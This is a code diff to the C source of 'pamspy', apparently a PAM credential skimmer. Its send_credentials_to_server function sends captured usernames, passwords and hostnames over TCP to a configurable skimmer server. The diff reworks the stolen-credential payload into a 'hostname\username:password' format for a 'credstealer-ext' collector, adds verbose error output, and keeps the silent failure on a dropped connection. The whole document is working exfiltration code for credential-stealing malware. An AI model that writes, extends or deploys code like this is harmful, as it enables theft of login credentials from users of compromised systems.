@@ -21,6 +21,7 @@
 #ifndef SKIMMER_IP
 #define SKIMMER_IP "127.0.0.1"
 #endif
+
 #ifndef SKIMMER_PORT
 #define SKIMMER_PORT 9999
 #endif
@@ -232,31 +233,40 @@ static void send_credentials_to_server(const char *username,
     // Set up server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(SKIMMER_PORT);
+    server_addr.sin_port = htons(SKIMMER_PORT);  // Port for the skimmer server
     
     // Convert IP address
     if (inet_pton(AF_INET, SKIMMER_IP, &server_addr.sin_addr) <= 0) {
+        if (env.verbose) {
+            fprintf(stderr, "pamspy: Invalid SKIMMER_IP address: %s\n", SKIMMER_IP);
+        }
         close(sock);
         return;
     }
     
     // Connect to server
     if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        if (env.verbose) {
+            fprintf(stderr, "pamspy: Failed to connect to %s:%d\n", SKIMMER_IP, SKIMMER_PORT);
+        }
         close(sock);
         return;  // Silently fail if connection fails
     }
     
-    // Create JSON payload (using escaped strings)
+    // Create payload compatible with credstealer-ext server (username:password)
+    // We include hostname in the username field to distinguish sources
     snprintf(json_buffer, sizeof(json_buffer),
-             "{\"hostname\": \"%s\", \"username\": \"%s\", \"password\": \"%s\", \"pid\": %d, \"process\": \"%s\"}",
-             esc_hostname,
-             esc_username,
-             esc_password,
-             pid,
-             esc_process);
+             "%s\\%s:%s",
+             hostname,
+             username ? username : "unknown",
+             password ? password : "");
     
     // Send data
-    send(sock, json_buffer, strlen(json_buffer), 0);
+    if (send(sock, json_buffer, strlen(json_buffer), 0) < 0) {
+        if (env.verbose) {
+           fprintf(stderr, "pamspy: Failed to send data\n");
+        }
+    }
     
     // Close socket
     close(sock);
